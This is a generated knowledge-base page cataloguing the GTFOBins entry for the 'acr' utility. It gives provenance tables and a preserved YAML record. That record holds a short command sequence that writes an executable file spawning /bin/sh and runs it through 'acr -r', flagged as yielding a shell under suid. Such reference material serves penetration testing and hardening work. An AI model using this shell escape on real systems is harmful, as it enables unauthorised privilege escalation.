---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# acr

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `acr` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/acr` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [acr](../../tools/linux/acr.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | acr |
| name | acr |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/acr/ |

## Preserved Source Material

```yaml
_body: ''
_name: acr
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/acr
functions:
  command:
  - code: 'echo -e ''x:\n\t/bin/sh 1>&0 2>&0'' >/path/to/temp-file

      chmod +x /path/to/temp-file

      acr -r ./relative/path/to/temp-file'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
